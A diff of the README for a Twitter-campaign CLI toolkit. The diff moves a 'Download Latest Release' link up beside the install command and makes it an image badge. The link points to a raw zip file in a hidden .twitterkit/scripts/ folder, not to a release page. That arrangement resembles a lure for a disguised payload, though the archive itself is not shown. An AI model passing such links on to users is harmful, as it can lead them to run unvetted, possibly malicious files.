@@ -14,13 +14,15 @@ Welcome to the **twitter-init-kit**! This is your go-to toolkit for creating and
 - **Evidence Loops**: Use optional TweetClaw and OpenClaw workflows to search tweets,
   inspect replies, and monitor launch language before writing campaign specs.
 
-## 📥 Install
+## 📥 Download & Install
 
 Install the CLI directly from this repository:
 
 ```bash
 uv tool install --from git+https://github.com/BienvenuONIODJE/twitter-init-kit.git twitterify-cli
 ```
+
+You can also download the packaged starter archive:
 
 [![Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
 
@@ -35,10 +37,6 @@ You can also run the CLI without installing it first:
 ```bash
 uvx --from git+https://github.com/BienvenuONIODJE/twitter-init-kit.git twitterify init my-twitter-launch
 ```
-
-You can also download the packaged starter archive:
-
-[Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
 
 ## 🖥️ System Requirements
 
